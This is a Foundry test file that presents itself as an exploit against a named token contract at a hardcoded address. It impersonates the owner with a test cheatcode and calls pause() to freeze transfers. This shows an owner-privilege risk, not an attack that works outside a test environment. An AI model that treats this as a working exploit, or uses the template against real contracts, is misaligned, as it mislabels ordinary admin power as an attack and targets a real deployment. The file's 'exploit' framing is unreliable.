// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDoctorShiba {
    function pause() external;
    function paused() external view returns (bool);
    function owner() external view returns (address);
    function unpause() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    IDoctorShiba ds;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ds = IDoctorShiba(TARGET);
        vm.label(TARGET, "DoctorShiba Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the owner address
        address owner = ds.owner();
        console.log("Contract owner:", owner);

        // Impersonate the owner
        vm.startPrank(owner);

        // Call pause() to freeze all transfers
         ds.pause();

        vm.stopPrank();

        // Verify the paused state is now true (oracle check)
        bool isPaused = ds.paused();
        console.log("Paused state:", isPaused);
        assertEq(isPaused, true, "Contract should be paused after owner calls pause()");
        assertEq(isPaused, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
